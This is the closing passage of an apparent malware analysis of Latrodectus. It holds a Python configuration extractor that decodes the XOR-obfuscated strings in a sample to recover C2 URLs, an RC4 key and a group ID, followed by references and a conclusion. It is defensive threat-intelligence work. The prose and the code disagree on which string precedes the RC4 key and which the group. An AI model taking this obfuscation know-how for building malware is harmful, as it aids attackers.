5.  Use the identified EGG to split data (obfsucated string);
6.  Extract data from the mathes of the `EGG` that contains the _key_ and the _seed_,
    combining both with a XOR operation give the string size `size = (key ^ seed) & 0xff`;
7.  Get the obfsucated data from the above match offset and the size;
8.  Debfuscated each string;
9.  Match URL using the `http` first character;
10. Base on all analyzed sample, the `group` is always place after the `ERROR` string (the
    C2 command) and the `RC4` key is always after the `/files/` string (used to replace
    some C2 response body).

<!--listend-->

```python
import re
import struct
import pefile
import logging

from collections import Counter
from typing import Optional, List, Dict

logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)


def parse_pe(pe_path: str) -> bytes:
    """Extract data from the .data section of the PE,
    returns a byte array otherwise raise ValueError"""

    pe: pefile.PE = pefile.PE(pe_path)
    data_section: Optional[pefile.SectionStructure] = None

    for section in pe.sections:
        if section.Name.startswith(b".data"):
            data_section = section

    if not data_section:
        raise ValueError("no .data section found")

    return data_section.get_data()


def identify_latrodectus_egg_obfuscated_string(data: bytes) -> re.Pattern:
    """Identify the pattern at the beggining of the obfuscated strings"""

    # need to identifier the EGG_OBFUSCATED_STRING...
    patterns = []
    for str_data in filter(lambda x: x, data.split(b"\x00")):
        patterns.append(str_data[:4])

    EGG_PATTERN = Counter(patterns).most_common(1)[0][0]  # get the most common pattern

    if not EGG_PATTERN:
        raise ValueError("no begging string pattern found")

    # note the best way to build the RE pattern...
    LATRODECTUS_EGG_STRING = re.compile(EGG_PATTERN + b"(..)")
    logging.debug(f"Found an STRING EGG pattern: 0x{EGG_PATTERN.hex()}")

    return LATRODECTUS_EGG_STRING


def deobfuscate_all_strings(
    data: bytes, LATRODECTUS_EGG_STRING: re.Pattern
) -> List[str]:
    """
    Split data by the LATRODECTUS_EGG_STRING,
    then deobfuscated each one of them and return their
    string value regarding their encoding: utf-8 or utf-16
    """

    strings: List[str] = []

    for match in LATRODECTUS_EGG_STRING.finditer(data):
        start_position = match.start() + 6
        key, seed = struct.unpack("<ih", match.group())
        size = (key ^ seed) & 0xFF

        ciphertext = data[start_position : start_position + size]
        cleartext = bytearray(size)

        for index in range(size):
            key += 1
            cleartext[index] = (key ^ ciphertext[index]) & 0xFF

        if cleartext.endswith(b"\x00" * 2):  # wide string
            strings.append(cleartext.decode("utf-16"))
        else:
            strings.append(cleartext.decode())

    return strings


def extract_configuration_from_cleartexts(strings: List[str]) -> Dict:
    configuration = {"C2": [], "rc4_key": "", "group": ""}

    for index, value in enumerate(strings):
        if value == "ERROR\x00":
            configuration["rc4_key"] = strings[index + 1].replace("\x00", "")
            logging.debug(f"rc4 key is: {configuration['rc4_key']}")
        if value == "/files/\x00":
            configuration["group"] = strings[index + 1].replace("\x00", "")
            logging.debug(f"latrodectus group: {configuration['group']}")
        if value.startswith("http"):
            configuration["C2"].append(value.replace("\x00", ""))
            logging.debug(f"update C2: {configuration['C2']}")

    logging.info(configuration)
    return configuration


def main(path: str) -> Dict:
    """take a PE path and return
    the Latrodectus configuration"""

    data = parse_pe(path)
    EGG_STRING = identify_latrodectus_egg_obfuscated_string(data)
    strings = deobfuscate_all_strings(data, EGG_STRING)
    configuration = extract_configuration_from_cleartexts(strings)
    return configuration


if __name__ == "__main__":
    import sys

    path = sys.argv[1]
    try:
        print(main(path))
    except Exception as err:
        logging.error(f"failed to extract configuration from {path}, error: {err}")
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 14:</span>
  Latrodectus configuration extractor
</div>


### External references {#external-references}

-   <https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice>
-   <https://blog.reveng.ai/latrodectus-distribution-via-brc4/>
-   <https://www.bitsight.com/blog/latrodectus-are-you-coming-back>
-   <https://cybergeeks.tech/a-detailed-analysis-of-the-stop-djvu-ransomware/> [useful for CLSID]
-   <https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39> [correlation with IcedID]
-   <https://0x0d4y.blog/latrodectus-technical-analysis-of-the-new-icedid/>
-   [cyberchef com Latrodectus](https://cyberchef.cti.guru/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)RC4(%7B'option':'UTF8','string':'12345'%7D,'Latin1','Latin1')&input=RTNsOUkzNUxYaU9XS1lIaWxEV3VKb1VPVFUzTk95ak5HbnAzbXVGVU9yYWJ6dkZ3NkZwb09RcWRCWm1zVVY1RTdGelhXSEtnQmFmUjZQY1Bja0JzSUIydkloYjNDWi9RSFBvRU8xaGMwQSsrUHBMUWpwUldKa0szRUZEeEgvUjVSWWpoSW5POGhjMGpUbGpDOTFHTVZzdGpreGdRbnVaTEdCVzZBVi9nejRWck5NV1V4RlV0UDRmZGcvSEtDUkViUm0rZ0lIa0gvN0pjOVE9PSA)


## Conclusion {#conclusion}

Even after the large LEA operation at the beginning of 2024 (Operation Endgame),
Latrodectus remains a major threat in the cybercrime landscape.
The various updates it has received are a reliable indicator that the threat actors behind
this malware are continuously improving the malware and its techniques.

I hope you enjoy the read :pray:. All feedback is welcome.
